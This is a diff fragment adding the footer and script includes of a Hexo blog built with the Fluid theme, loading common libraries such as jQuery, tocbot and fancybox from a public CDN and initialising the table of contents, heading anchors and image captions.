+       <p> Copyright &copy; 2022&nbsp;-&nbsp;2023 <a href="/">Modifier</a> </p> <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme - <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a></p> <!--  <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> -->
+
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
